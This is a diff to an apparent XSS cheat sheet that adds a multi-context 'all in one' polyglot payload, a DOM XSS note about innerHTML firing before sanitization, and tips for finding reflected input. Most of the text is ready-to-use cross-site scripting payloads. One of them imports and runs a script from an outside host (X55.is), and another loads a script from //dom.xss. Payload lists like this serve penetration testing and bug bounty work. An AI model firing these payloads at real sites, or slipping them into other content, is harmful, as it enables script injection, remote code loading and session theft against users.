@@ -1,3 +1,7 @@
+### XSS all in one
+```
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\http://X55.is/.source))}//\76-->
+```
 ### XSS ployglot
 ```
 \u0022\u003c%26quot;%26gt;%26lt;"';}};"></ScRipt><svg/oNLoad=confirm(69)>${{7*7}}
@@ -19,6 +23,19 @@ link=qwe"srcdoc="\u003ce<script%26Tab;src=//dom.xss>\u003ce</script%26Tab;e>
 <input type={{name}}>         ==> vulnerable code
 <input type="{{name}}" >      ==> well secure code
 ````
+
+
+#### There a small quirk in DOM xss
+```
+IF you see this code snippet
+let a =createElement('div');
+a.innerHTML="variable here"
+b=sanitize(a);
+and add to dom after here
+
+we can execute xss before the sanitize or adding to dom. <img src=x onerror=alert(1)> actually executes before appending to the dom.
+```
+
 ---
 #### Quick tips
 - See the reflected value and open inspect element. Search(ctrl+f) for the entered keywords and trace where is it being used.
